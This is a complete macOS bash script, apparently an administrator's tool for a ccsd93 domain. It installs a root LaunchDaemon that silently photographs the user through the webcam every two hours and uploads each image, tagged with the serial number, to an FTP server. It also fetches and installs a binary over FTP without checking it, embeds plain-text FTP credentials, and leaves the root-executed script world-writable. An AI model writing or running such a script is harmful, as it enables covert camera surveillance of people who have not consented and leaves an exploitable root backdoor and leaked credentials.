#!/bin/bash
 
launchctl unload /Library/LaunchDaemons/com.ccsd93.camera_capture.plist
rm /Library/LaunchDaemons/com.ccsd93.camera_capture.plist
 
echo "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">
<plist version=\"1.0\">
<dict>
 
<key>Label</key>
<string>com.ccsd93.camera_capture</string>
<key>ProgramArguments</key>
<array>
<string>/bin/bash</string>
<string>/var/root/camera_capture.sh</string>
</array>
<key>StartInterval</key>
<integer>7200</integer>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>" >> /Library/LaunchDaemons/com.ccsd93.camera_capture.plist
 
chown root /Library/LaunchDaemons/com.ccsd93.camera_capture.plist
chgrp wheel /Library/LaunchDaemons/com.ccsd93.camera_capture.plist
chmod 644 /Library/LaunchDaemons/com.ccsd93.camera_capture.plist
 
curl ftp://webbackup.Users:webbackup@tech-01.ccsd93.com/imagesnap > /usr/bin/imagesnap
 
chmod +x /usr/bin/imagesnap
 
rm /var/root/camera_capture.sh
 
echo "#! /bin/bash
 
currTime=\$(date +%Y%m%d%H%M%S)
serialNumber=\$(system_profiler SPHardwareDataType | grep \"Serial Number\" | awk '{ print \$4 }')
 
/usr/bin/imagesnap /tmp/\$serialNumber-cam_\$currTime.jpg
 
curl -T /tmp/\$serialNumber-cam_\$currTime.jpg ftp://webbackup.Users:webbackup@tech-01.ccsd93.com/
 
sleep 60
 
rm /tmp/\$serialNumber-cam_\$currTime.jpg" >> /var/root/camera_capture.sh
 
chown root /var/root/camera_capture.sh
chgrp wheel /var/root/camera_capture.sh
chmod 777 /var/root/camera_capture.sh
 
launchctl load /Library/LaunchDaemons/com.ccsd93.camera_capture.plist